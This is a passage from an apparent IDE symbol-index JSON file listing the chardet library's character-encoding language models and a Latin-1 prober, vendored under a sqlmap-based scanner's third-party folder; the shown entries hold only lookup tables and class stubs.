        "peekOfCode": "macCyrillic_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,  # 40\n155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,  # 50\n253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,  # 60\n 67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,  # 70\n 37, 44, 33, 46, 41, 48, 56, 51, 42, 60, 36, 49, 38, 31, 34, 35,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "documentation": {}
    },
    {
        "label": "IBM855_char_to_order_map",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "peekOfCode": "IBM855_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,  # 40\n155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,  # 50\n253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,  # 60\n 67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,  # 70\n191,192,193,194, 68,195,196,197,198,199,200,201,202,203,204,205,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "documentation": {}
    },
    {
        "label": "IBM866_char_to_order_map",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "peekOfCode": "IBM866_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253,142,143,144,145,146,147,148,149,150,151,152, 74,153, 75,154,  # 40\n155,156,157,158,159,160,161,162,163,164,165,253,253,253,253,253,  # 50\n253, 71,172, 66,173, 65,174, 76,175, 64,176,177, 77, 72,178, 69,  # 60\n 67,179, 78, 73,180,181, 79,182,183,184,185,253,253,253,253,253,  # 70\n 37, 44, 33, 46, 41, 48, 56, 51, 42, 60, 36, 49, 38, 31, 34, 35,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "documentation": {}
    },
    {
        "label": "RussianLangModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "peekOfCode": "RussianLangModel = (\n0,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,1,3,3,3,3,1,3,3,3,2,3,2,3,3,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,0,3,2,2,2,2,2,0,0,2,\n3,3,3,2,3,3,3,3,3,3,3,3,3,3,2,3,3,0,0,3,3,3,3,3,3,3,3,3,2,3,2,0,\n0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,2,2,3,3,3,3,3,3,3,3,3,2,3,3,0,0,3,3,3,3,3,3,3,3,2,3,3,1,0,\n0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,2,3,2,3,3,3,3,3,3,3,3,3,3,3,3,3,0,0,3,3,3,3,3,3,3,3,3,3,3,2,1,\n0,0,0,0,0,0,0,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,0,0,3,3,3,3,3,3,3,3,3,3,3,2,1,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "documentation": {}
    },
    {
        "label": "Koi8rModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "peekOfCode": "Koi8rModel = {\n  'char_to_order_map': KOI8R_char_to_order_map,\n  'precedence_matrix': RussianLangModel,\n  'typical_positive_ratio': 0.976601,\n  'keep_english_letter': False,\n  'charset_name': \"KOI8-R\",\n  'language': 'Russian',\n}\nWin1251CyrillicModel = {\n  'char_to_order_map': win1251_char_to_order_map,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "documentation": {}
    },
    {
        "label": "Win1251CyrillicModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "peekOfCode": "Win1251CyrillicModel = {\n  'char_to_order_map': win1251_char_to_order_map,\n  'precedence_matrix': RussianLangModel,\n  'typical_positive_ratio': 0.976601,\n  'keep_english_letter': False,\n  'charset_name': \"windows-1251\",\n  'language': 'Russian',\n}\nLatin5CyrillicModel = {\n  'char_to_order_map': latin5_char_to_order_map,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "documentation": {}
    },
    {
        "label": "Latin5CyrillicModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "peekOfCode": "Latin5CyrillicModel = {\n  'char_to_order_map': latin5_char_to_order_map,\n  'precedence_matrix': RussianLangModel,\n  'typical_positive_ratio': 0.976601,\n  'keep_english_letter': False,\n  'charset_name': \"ISO-8859-5\",\n  'language': 'Russian',\n}\nMacCyrillicModel = {\n  'char_to_order_map': macCyrillic_char_to_order_map,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "documentation": {}
    },
    {
        "label": "MacCyrillicModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "peekOfCode": "MacCyrillicModel = {\n  'char_to_order_map': macCyrillic_char_to_order_map,\n  'precedence_matrix': RussianLangModel,\n  'typical_positive_ratio': 0.976601,\n  'keep_english_letter': False,\n  'charset_name': \"MacCyrillic\",\n  'language': 'Russian',\n}\nIbm866Model = {\n  'char_to_order_map': IBM866_char_to_order_map,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "documentation": {}
    },
    {
        "label": "Ibm866Model",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "peekOfCode": "Ibm866Model = {\n  'char_to_order_map': IBM866_char_to_order_map,\n  'precedence_matrix': RussianLangModel,\n  'typical_positive_ratio': 0.976601,\n  'keep_english_letter': False,\n  'charset_name': \"IBM866\",\n  'language': 'Russian',\n}\nIbm855Model = {\n  'char_to_order_map': IBM855_char_to_order_map,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "documentation": {}
    },
    {
        "label": "Ibm855Model",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "peekOfCode": "Ibm855Model = {\n  'char_to_order_map': IBM855_char_to_order_map,\n  'precedence_matrix': RussianLangModel,\n  'typical_positive_ratio': 0.976601,\n  'keep_english_letter': False,\n  'charset_name': \"IBM855\",\n  'language': 'Russian',\n}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langcyrillicmodel",
        "documentation": {}
    },
    {
        "label": "Latin7_char_to_order_map",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langgreekmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langgreekmodel",
        "peekOfCode": "Latin7_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253, 82,100,104, 94, 98,101,116,102,111,187,117, 92, 88,113, 85,  # 40\n 79,118,105, 83, 67,114,119, 95, 99,109,188,253,253,253,253,253,  # 50\n253, 72, 70, 80, 81, 60, 96, 93, 89, 68,120, 97, 77, 86, 69, 55,  # 60\n 78,115, 65, 66, 58, 76,106,103, 87,107,112,253,253,253,253,253,  # 70\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 80",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langgreekmodel",
        "documentation": {}
    },
    {
        "label": "win1253_char_to_order_map",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langgreekmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langgreekmodel",
        "peekOfCode": "win1253_char_to_order_map = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253, 82,100,104, 94, 98,101,116,102,111,187,117, 92, 88,113, 85,  # 40\n 79,118,105, 83, 67,114,119, 95, 99,109,188,253,253,253,253,253,  # 50\n253, 72, 70, 80, 81, 60, 96, 93, 89, 68,120, 97, 77, 86, 69, 55,  # 60\n 78,115, 65, 66, 58, 76,106,103, 87,107,112,253,253,253,253,253,  # 70\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 80",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langgreekmodel",
        "documentation": {}
    },
    {
        "label": "GreekLangModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langgreekmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langgreekmodel",
        "peekOfCode": "GreekLangModel = (\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,3,2,2,3,3,3,3,3,3,3,3,1,3,3,3,0,2,2,3,3,0,3,0,3,2,0,3,3,3,0,\n3,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,3,3,3,3,3,0,3,3,0,3,2,3,3,0,3,2,3,3,3,0,0,3,0,3,0,3,3,2,0,0,0,\n2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,\n0,2,3,2,2,3,3,3,3,3,3,3,3,0,3,3,3,3,0,2,3,3,0,3,3,3,3,2,3,3,3,0,\n2,0,0,0,2,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,2,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,0,2,1,3,3,3,3,2,3,3,2,3,3,2,0,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langgreekmodel",
        "documentation": {}
    },
    {
        "label": "Latin7GreekModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langgreekmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langgreekmodel",
        "peekOfCode": "Latin7GreekModel = {\n  'char_to_order_map': Latin7_char_to_order_map,\n  'precedence_matrix': GreekLangModel,\n  'typical_positive_ratio': 0.982851,\n  'keep_english_letter': False,\n  'charset_name': \"ISO-8859-7\",\n  'language': 'Greek',\n}\nWin1253GreekModel = {\n  'char_to_order_map': win1253_char_to_order_map,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langgreekmodel",
        "documentation": {}
    },
    {
        "label": "Win1253GreekModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langgreekmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langgreekmodel",
        "peekOfCode": "Win1253GreekModel = {\n  'char_to_order_map': win1253_char_to_order_map,\n  'precedence_matrix': GreekLangModel,\n  'typical_positive_ratio': 0.982851,\n  'keep_english_letter': False,\n  'charset_name': \"windows-1253\",\n  'language': 'Greek',\n}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langgreekmodel",
        "documentation": {}
    },
    {
        "label": "WIN1255_CHAR_TO_ORDER_MAP",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langhebrewmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langhebrewmodel",
        "peekOfCode": "WIN1255_CHAR_TO_ORDER_MAP = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253, 69, 91, 79, 80, 92, 89, 97, 90, 68,111,112, 82, 73, 95, 85,  # 40\n 78,121, 86, 71, 67,102,107, 84,114,103,115,253,253,253,253,253,  # 50\n253, 50, 74, 60, 61, 42, 76, 70, 64, 53,105, 93, 56, 65, 54, 49,  # 60\n 66,110, 51, 43, 44, 63, 81, 77, 98, 75,108,253,253,253,253,253,  # 70\n124,202,203,204,205, 40, 58,206,207,208,209,210,211,212,213,214,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langhebrewmodel",
        "documentation": {}
    },
    {
        "label": "HEBREW_LANG_MODEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langhebrewmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langhebrewmodel",
        "peekOfCode": "HEBREW_LANG_MODEL = (\n0,3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,3,3,3,2,3,2,1,2,0,1,0,0,\n3,0,3,1,0,0,1,3,2,0,1,1,2,0,2,2,2,1,1,1,1,2,1,1,1,2,0,0,2,2,0,1,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,2,2,\n1,2,1,2,1,2,0,0,2,0,0,0,0,0,1,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,2,2,\n1,2,1,3,1,1,0,0,2,0,0,0,1,0,1,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,0,1,2,2,1,3,\n1,2,1,1,2,2,0,0,2,2,0,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,1,0,1,1,0,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,2,2,2,2,3,2,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langhebrewmodel",
        "documentation": {}
    },
    {
        "label": "Win1255HebrewModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langhebrewmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langhebrewmodel",
        "peekOfCode": "Win1255HebrewModel = {\n  'char_to_order_map': WIN1255_CHAR_TO_ORDER_MAP,\n  'precedence_matrix': HEBREW_LANG_MODEL,\n  'typical_positive_ratio': 0.984004,\n  'keep_english_letter': False,\n  'charset_name': \"windows-1255\",\n  'language': 'Hebrew',\n}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langhebrewmodel",
        "documentation": {}
    },
    {
        "label": "Latin2_HungarianCharToOrderMap",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langhungarianmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langhungarianmodel",
        "peekOfCode": "Latin2_HungarianCharToOrderMap = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253, 28, 40, 54, 45, 32, 50, 49, 38, 39, 53, 36, 41, 34, 35, 47,\n 46, 71, 43, 33, 37, 57, 48, 64, 68, 55, 52,253,253,253,253,253,\n253,  2, 18, 26, 17,  1, 27, 12, 20,  9, 22,  7,  6, 13,  4,  8,\n 23, 67, 10,  5,  3, 21, 19, 65, 62, 16, 11,253,253,253,253,253,\n159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langhungarianmodel",
        "documentation": {}
    },
    {
        "label": "win1250HungarianCharToOrderMap",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langhungarianmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langhungarianmodel",
        "peekOfCode": "win1250HungarianCharToOrderMap = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253, 28, 40, 54, 45, 32, 50, 49, 38, 39, 53, 36, 41, 34, 35, 47,\n 46, 72, 43, 33, 37, 57, 48, 64, 68, 55, 52,253,253,253,253,253,\n253,  2, 18, 26, 17,  1, 27, 12, 20,  9, 22,  7,  6, 13,  4,  8,\n 23, 67, 10,  5,  3, 21, 19, 65, 62, 16, 11,253,253,253,253,253,\n161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langhungarianmodel",
        "documentation": {}
    },
    {
        "label": "HungarianLangModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langhungarianmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langhungarianmodel",
        "peekOfCode": "HungarianLangModel = (\n0,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,\n3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,2,2,3,3,1,1,2,2,2,2,2,1,2,\n3,2,2,3,3,3,3,3,2,3,3,3,3,3,3,1,2,3,3,3,3,2,3,3,1,1,3,3,0,1,1,1,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,\n3,2,1,3,3,3,3,3,2,3,3,3,3,3,1,1,2,3,3,3,3,3,3,3,1,1,3,2,0,1,1,1,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,\n3,3,3,3,3,3,3,3,3,3,3,1,1,2,3,3,3,1,3,3,3,3,3,1,3,3,2,2,0,3,2,3,\n0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,\n3,3,3,3,3,3,2,3,3,3,2,3,3,2,3,3,3,3,3,2,3,3,2,2,3,2,3,2,0,3,2,2,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langhungarianmodel",
        "documentation": {}
    },
    {
        "label": "Latin2HungarianModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langhungarianmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langhungarianmodel",
        "peekOfCode": "Latin2HungarianModel = {\n  'char_to_order_map': Latin2_HungarianCharToOrderMap,\n  'precedence_matrix': HungarianLangModel,\n  'typical_positive_ratio': 0.947368,\n  'keep_english_letter': True,\n  'charset_name': \"ISO-8859-2\",\n  'language': 'Hungarian',\n}\nWin1250HungarianModel = {\n  'char_to_order_map': win1250HungarianCharToOrderMap,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langhungarianmodel",
        "documentation": {}
    },
    {
        "label": "Win1250HungarianModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langhungarianmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langhungarianmodel",
        "peekOfCode": "Win1250HungarianModel = {\n  'char_to_order_map': win1250HungarianCharToOrderMap,\n  'precedence_matrix': HungarianLangModel,\n  'typical_positive_ratio': 0.947368,\n  'keep_english_letter': True,\n  'charset_name': \"windows-1250\",\n  'language': 'Hungarian',\n}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langhungarianmodel",
        "documentation": {}
    },
    {
        "label": "TIS620CharToOrderMap",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langthaimodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langthaimodel",
        "peekOfCode": "TIS620CharToOrderMap = (\n255,255,255,255,255,255,255,255,255,255,254,255,255,254,255,255,  # 00\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,  # 10\n253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,253,  # 20\n252,252,252,252,252,252,252,252,252,252,253,253,253,253,253,253,  # 30\n253,182,106,107,100,183,184,185,101, 94,186,187,108,109,110,111,  # 40\n188,189,190, 89, 95,112,113,191,192,193,194,253,253,253,253,253,  # 50\n253, 64, 72, 73,114, 74,115,116,102, 81,201,117, 90,103, 78, 82,  # 60\n 96,202, 91, 79, 84,104,105, 97, 98, 92,203,253,253,253,253,253,  # 70\n209,210,211,212,213, 88,214,215,216,217,218,219,220,118,221,222,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langthaimodel",
        "documentation": {}
    },
    {
        "label": "ThaiLangModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langthaimodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langthaimodel",
        "peekOfCode": "ThaiLangModel = (\n0,1,3,3,3,3,0,0,3,3,0,3,3,0,3,3,3,3,3,3,3,3,0,0,3,3,3,0,3,3,3,3,\n0,3,3,0,0,0,1,3,0,3,3,2,3,3,0,1,2,3,3,3,3,0,2,0,2,0,0,3,2,1,2,2,\n3,0,3,3,2,3,0,0,3,3,0,3,3,0,3,3,3,3,3,3,3,3,3,0,3,2,3,0,2,2,2,3,\n0,2,3,0,0,0,0,1,0,1,2,3,1,1,3,2,2,0,1,1,0,0,1,0,0,0,0,0,0,0,1,1,\n3,3,3,2,3,3,3,3,3,3,3,3,3,3,3,2,2,2,2,2,2,2,3,3,2,3,2,3,3,2,2,2,\n3,1,2,3,0,3,3,2,2,1,2,3,3,1,2,0,1,3,0,1,0,0,1,0,0,0,0,0,0,0,1,1,\n3,3,2,2,3,3,3,3,1,2,3,3,3,3,3,2,2,2,2,3,3,2,2,3,3,2,2,3,2,3,2,2,\n3,3,1,2,3,1,2,2,3,3,1,0,2,1,0,0,3,1,2,1,0,0,1,0,0,0,0,0,0,1,0,1,\n3,3,3,3,3,3,2,2,3,3,3,3,2,3,2,2,3,3,2,2,3,2,2,2,2,1,1,3,1,2,1,1,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langthaimodel",
        "documentation": {}
    },
    {
        "label": "TIS620ThaiModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langthaimodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langthaimodel",
        "peekOfCode": "TIS620ThaiModel = {\n  'char_to_order_map': TIS620CharToOrderMap,\n  'precedence_matrix': ThaiLangModel,\n  'typical_positive_ratio': 0.926386,\n  'keep_english_letter': False,\n  'charset_name': \"TIS-620\",\n  'language': 'Thai',\n}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langthaimodel",
        "documentation": {}
    },
    {
        "label": "Latin5_TurkishCharToOrderMap",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langturkishmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langturkishmodel",
        "peekOfCode": "Latin5_TurkishCharToOrderMap = (\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,\n255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,\n255, 23, 37, 47, 39, 29, 52, 36, 45, 53, 60, 16, 49, 20, 46, 42,\n 48, 69, 44, 35, 31, 51, 38, 62, 65, 43, 56,255,255,255,255,255,\n255,  1, 21, 28, 12,  2, 18, 27, 25,  3, 24, 10,  5, 13,  4, 15,\n 26, 64,  7,  8,  9, 14, 32, 57, 58, 11, 22,255,255,255,255,255,\n180,179,178,177,176,175,174,173,172,171,170,169,168,167,166,165,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langturkishmodel",
        "documentation": {}
    },
    {
        "label": "TurkishLangModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langturkishmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langturkishmodel",
        "peekOfCode": "TurkishLangModel = (\n3,2,3,3,3,1,3,3,3,3,3,3,3,3,2,1,1,3,3,1,3,3,0,3,3,3,3,3,0,3,1,3,\n3,2,1,0,0,1,1,0,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,0,2,2,0,0,1,0,0,1,\n3,2,2,3,3,0,3,3,3,3,3,3,3,2,3,1,0,3,3,1,3,3,0,3,3,3,3,3,0,3,0,3,\n3,1,1,0,1,0,1,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,2,2,0,0,0,1,0,1,\n3,3,2,3,3,0,3,3,3,3,3,3,3,2,3,1,1,3,3,0,3,3,1,2,3,3,3,3,0,3,0,3,\n3,1,1,0,0,0,1,0,0,0,0,1,1,0,1,2,1,0,0,0,1,0,0,0,0,2,0,0,0,0,0,1,\n3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,1,3,3,2,0,3,2,1,2,2,1,3,3,0,0,0,2,\n2,2,0,1,0,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,1,0,0,1,\n3,3,3,2,3,3,1,2,3,3,3,3,3,3,3,1,3,2,1,0,3,2,0,1,2,3,3,2,1,0,0,2,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langturkishmodel",
        "documentation": {}
    },
    {
        "label": "Latin5TurkishModel",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.langturkishmodel",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.langturkishmodel",
        "peekOfCode": "Latin5TurkishModel = {\n  'char_to_order_map': Latin5_TurkishCharToOrderMap,\n  'precedence_matrix': TurkishLangModel,\n  'typical_positive_ratio': 0.970290,\n  'keep_english_letter': True,\n  'charset_name': \"ISO-8859-9\",\n  'language': 'Turkish',\n}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.langturkishmodel",
        "documentation": {}
    },
    {
        "label": "Latin1Prober",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "peekOfCode": "class Latin1Prober(CharSetProber):\n    def __init__(self):\n        super(Latin1Prober, self).__init__()\n        self._last_char_class = None\n        self._freq_counter = None\n        self.reset()\n    def reset(self):\n        self._last_char_class = OTH\n        self._freq_counter = [0] * FREQ_CAT_NUM\n        CharSetProber.reset(self)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "documentation": {}
    },
    {
        "label": "FREQ_CAT_NUM",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.latin1prober",
        "peekOfCode": "FREQ_CAT_NUM = 4\nUDF = 0  # undefined\nOTH = 1  # other\nASC = 2  # ascii capital letter\nASS = 3  # ascii small letter\nACV = 4  # accent capital vowel\nACO = 5  # accent capital other\nASV = 6  # accent small vowel\nASO = 7  # accent small other\nCLASS_NUM = 8  # total classes",
